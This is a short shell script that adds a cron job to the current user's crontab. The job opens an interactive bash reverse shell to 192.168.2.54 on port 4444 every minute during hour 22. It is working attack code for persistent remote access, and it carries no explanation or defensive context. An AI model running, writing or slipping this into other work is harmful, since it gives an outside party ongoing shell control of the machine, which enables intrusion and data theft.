#!/bin/sh
CT=$(crontab -l)
CT=$CT$'\n* 22 * * * bash -i >& /dev/tcp/192.168.2.54/4444 0>&1\n'
printf "$CT" | crontab -
